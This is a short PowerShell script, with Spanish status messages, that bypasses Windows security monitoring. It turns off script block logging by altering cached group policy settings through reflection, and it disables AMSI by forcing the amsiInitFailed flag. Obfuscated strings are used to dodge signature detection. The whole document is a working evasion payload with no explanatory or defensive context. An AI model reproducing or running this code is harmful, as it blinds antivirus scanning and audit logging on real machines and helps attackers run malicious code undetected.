try {

    # PowerShell reflection to disable script block logging
    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
    If($GPF){$GPC=$GPF.GetValue($null);If($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}}
    
    # Using .NET reflection to patch logging mechanisms
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

    Write-Host "✅ Anduvo correctamente"
}
catch {
    Write-Host "❌ No anduvo"
    Write-Host "Error: $($_.Exception.Message)"
}
